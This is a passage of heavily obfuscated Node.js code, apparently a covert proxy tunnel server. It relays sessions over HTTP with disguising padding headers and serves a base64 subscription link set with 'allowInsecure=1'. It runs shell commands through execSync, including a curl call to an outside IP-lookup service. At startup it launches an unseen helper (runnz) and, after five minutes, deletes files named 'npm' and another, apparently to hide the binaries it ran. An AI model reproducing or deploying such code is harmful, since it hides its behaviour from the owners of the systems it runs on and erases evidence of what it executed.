_0x339ed7=_0x5620;this[_0x339ed7(0x120)][_0x339ed7(0x15d)](_0x252f5a,_0x3e2d60=>{const _0x3b0cd9=_0x339ed7;_0x3e2d60?(log(_0x3b0cd9(0xc9),_0x3b0cd9(0x174)+_0x3e2d60[_0x3b0cd9(0x177)]),_0x225889(_0x3e2d60)):_0x464705();});});}[_0x21c0f6(0xe9)](){const _0x5acf5c=_0x21c0f6;if(!this['currentStreamRes']||!this['responseHeader'])return;try{!this[_0x5acf5c(0xca)]&&(this[_0x5acf5c(0x10d)]['write'](this[_0x5acf5c(0x103)]),this['headerSent']=!![]),this[_0x5acf5c(0x120)][_0x5acf5c(0x1a3)](this[_0x5acf5c(0x10d)]),this[_0x5acf5c(0x120)]['on'](_0x5acf5c(0xcd),()=>{const _0x4a0c46=_0x5acf5c;!this[_0x4a0c46(0x10d)][_0x4a0c46(0xce)]&&this[_0x4a0c46(0x10d)][_0x4a0c46(0xcd)]();}),this['remote']['on']('error',_0x9d9263=>{const _0x11bccb=_0x5acf5c;log(_0x11bccb(0xc9),_0x11bccb(0xd4)+_0x9d9263['message']),!this[_0x11bccb(0x10d)]['writableEnded']&&this[_0x11bccb(0x10d)][_0x11bccb(0xcd)]();});}catch(_0x1fa4dc){log(_0x5acf5c(0xc9),_0x5acf5c(0x12f)+_0x1fa4dc['message']),this[_0x5acf5c(0x155)]();}}[_0x21c0f6(0x155)](){const _0x1fed1f=_0x21c0f6;!this[_0x1fed1f(0x18c)]&&(this['cleaned']=!![],log('debug',_0x1fed1f(0x11c)+this[_0x1fed1f(0xee)]),this[_0x1fed1f(0x120)]&&(this[_0x1fed1f(0x120)]['destroy'](),this['remote']=null),this[_0x1fed1f(0x145)]=![],this[_0x1fed1f(0xca)]=![]);}}function _0x5620(_0x5aa240,_0x133d72){const _0x2cdefd=_0x2cde();return _0x5620=function(_0x562015,_0x3049d0){_0x562015=_0x562015-0xc8;let _0x2aff29=_0x2cdefd[_0x562015];return _0x2aff29;},_0x5620(_0x5aa240,_0x133d72);}const metaInfo=execSync(_0x21c0f6(0x12d),{'encoding':_0x21c0f6(0x194)}),ISP=metaInfo[_0x21c0f6(0xe4)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0x21c0f6(0x194)})['trim']();}catch(_0x12174c){try{IP='['+execSync(_0x21c0f6(0x130),{'encoding':'utf-8'})[_0x21c0f6(0xe4)]()+']';}catch(_0x6be657){log(_0x21c0f6(0xc9),_0x21c0f6(0x16e),_0x6be657['message']),IP=_0x21c0f6(0x148);}}const server=http['createServer']((_0x45c885,_0x1c6199)=>{const _0xf4d257=_0x21c0f6,_0x2e2c9d={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':_0xf4d257(0x19b),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x45c885[_0xf4d257(0x193)]==='/'){_0x1c6199[_0xf4d257(0x16d)](0xc8,{'Content-Type':_0xf4d257(0xe6)}),_0x1c6199['end'](_0xf4d257(0x116));return;}if(_0x45c885['url']==='/'+SUB_PATH){const _0xcd3ab9=_0xf4d257(0x11b)+UUID+'@'+IP+_0xf4d257(0x149)+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0xf4d257(0x17d)+SETTINGS[_0xf4d257(0x13a)]+_0xf4d257(0x138)+NAME+'-'+ISP,_0x43a424=Buffer[_0xf4d257(0xf4)](_0xcd3ab9)[_0xf4d257(0x127)](_0xf4d257(0xd9));_0x1c6199[_0xf4d257(0x16d)](0xc8,{'Content-Type':_0xf4d257(0xe6)}),_0x1c6199[_0xf4d257(0xcd)](_0x43a424+'\x0a');return;}const _0x2bd7b3=_0x45c885[_0xf4d257(0x193)]['match'](new RegExp(XPATH+_0xf4d257(0xd1)));if(!_0x2bd7b3){_0x1c6199['writeHead'](0x194),_0x1c6199[_0xf4d257(0xcd)]();return;}const _0x8713da=_0x2bd7b3[0x1],_0x4d8a7e=_0x2bd7b3[0x2]?parseInt(_0x2bd7b3[0x2]):null;if(_0x45c885[_0xf4d257(0x179)]===_0xf4d257(0x10f)&&!_0x4d8a7e){_0x2e2c9d[_0xf4d257(0x126)]=_0xf4d257(0x165),_0x2e2c9d[_0xf4d257(0x119)]=_0xf4d257(0x19f);let _0x2d49e8=sessions[_0xf4d257(0xe2)](_0x8713da);!_0x2d49e8&&(_0x2d49e8=new Session(_0x8713da),sessions[_0xf4d257(0xf1)](_0x8713da,_0x2d49e8),log('info',_0xf4d257(0x19c)+_0x8713da));_0x2d49e8['downstreamStarted']=!![];!_0x2d49e8[_0xf4d257(0xf2)](_0x1c6199,_0x2e2c9d)&&(log(_0xf4d257(0xc9),_0xf4d257(0xdd)+_0x8713da),!_0x1c6199['headersSent']&&(_0x1c6199['writeHead'](0x1f4),_0x1c6199['end']()),_0x2d49e8['cleanup'](),sessions[_0xf4d257(0x124)](_0x8713da));return;}if(_0x45c885['method']==='POST'&&_0x4d8a7e!==null){let _0x172542=sessions[_0xf4d257(0xe2)](_0x8713da);!_0x172542&&(_0x172542=new Session(_0x8713da),sessions['set'](_0x8713da,_0x172542),log(_0xf4d257(0xd2),_0xf4d257(0x191)+_0x8713da),setTimeout(()=>{const _0x1d19a5=_0xf4d257,_0x4de7c3=sessions['get'](_0x8713da);_0x4de7c3&&!_0x4de7c3[_0x1d19a5(0xf8)]&&(log('warn',_0x1d19a5(0x15e)+_0x8713da+_0x1d19a5(0x11d)),_0x4de7c3[_0x1d19a5(0x155)](),sessions[_0x1d19a5(0x124)](_0x8713da));},SETTINGS[_0xf4d257(0xd3)]));let _0x58cfe2=[],_0x2ae69a=0x0,_0x1270a1=![];_0x45c885['on'](_0xf4d257(0x176),_0x276991=>{const _0x2efc88=_0xf4d257;_0x2ae69a+=_0x276991[_0x2efc88(0x182)];if(_0x2ae69a>SETTINGS[_0x2efc88(0x1af)]){!_0x1270a1&&(_0x1c6199[_0x2efc88(0x16d)](0x19d),_0x1c6199[_0x2efc88(0xcd)](),_0x1270a1=!![]);return;}_0x58cfe2[_0x2efc88(0xcb)](_0x276991);}),_0x45c885['on'](_0xf4d257(0xcd),async()=>{const _0x43aa1d=_0xf4d257;if(_0x1270a1)return;try{const _0x1a5fce=Buffer[_0x43aa1d(0x13c)](_0x58cfe2);log('info',_0x43aa1d(0x11e)+_0x4d8a7e+_0x43aa1d(0x104)+_0x1a5fce[_0x43aa1d(0x182)]),await _0x172542[_0x43aa1d(0x18e)](_0x4d8a7e,_0x1a5fce),!_0x1270a1&&(_0x1c6199['writeHead'](0xc8,_0x2e2c9d),_0x1270a1=!![]),_0x1c6199[_0x43aa1d(0xcd)]();}catch(_0x57ea87){log(_0x43aa1d(0xc9),'Failed\x20to\x20process\x20POST\x20request:\x20'+_0x57ea87[_0x43aa1d(0x177)]),_0x172542[_0x43aa1d(0x155)](),sessions[_0x43aa1d(0x124)](_0x8713da),!_0x1270a1&&(_0x1c6199[_0x43aa1d(0x16d)](0x1f4),_0x1270a1=!![]),_0x1c6199[_0x43aa1d(0xcd)]();}});return;}_0x1c6199[_0xf4d257(0x16d)](0x194),_0x1c6199['end']();});server['on'](_0x21c0f6(0xd5),_0x3baf6e=>{const _0x163fbd=_0x21c0f6;log(_0x163fbd(0x137),_0x163fbd(0x1ac)+(_0x3baf6e[_0x163fbd(0x195)]||_0x163fbd(0xe5)));});function generatePadding(_0x11a4c4,_0x30fcd5){const _0x482336=_0x21c0f6,_0x1ffba1=_0x11a4c4+Math[_0x482336(0xf6)](Math[_0x482336(0x147)]()*(_0x30fcd5-_0x11a4c4));return Buffer[_0x482336(0xf4)](Array(_0x1ffba1)[_0x482336(0x161)]('X')['join'](''))[_0x482336(0x127)]('base64');}server[_0x21c0f6(0x172)]=0x975e0,server[_0x21c0f6(0x153)]=0x98968,server['on'](_0x21c0f6(0xc9),_0x271afd=>{const _0x46e841=_0x21c0f6;log(_0x46e841(0xc9),'Server\x20error:\x20'+_0x271afd[_0x46e841(0x177)]);});const delFiles=()=>{const _0x46674f=_0x21c0f6;['npm',_0x46674f(0x183)]['forEach'](_0x3ffb21=>fs[_0x46674f(0x17e)](_0x3ffb21,()=>{}));};server[_0x21c0f6(0x199)](PORT,()=>{const _0x30112c=_0x21c0f6;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console['log'](_0x30112c(0x115)+PORT),log(_0x30112c(0xd2),'================================='),log(_0x30112c(0xd2),'Log\x20level:\x20'+SETTINGS['LOG_LEVEL']),log(_0x30112c(0xd2),_0x30112c(0x131)+SETTINGS[_0x30112c(0x100)]),log(_0x30112c(0xd2),'Max\x20POST\x20size:\x20'+SETTINGS[_0x30112c(0x1af)]+'KB'),log(_0x30112c(0xd2),'Max\x20buffer\x20size:\x20'+SETTINGS[_0x30112c(0xfb)]+'KB'),log(_0x30112c(0xd2),_0x30112c(0x117)+SETTINGS[_0x30112c(0x1ad)]+'bytes'),log(_0x30112c(0xd2),_0x30112c(0xfa));});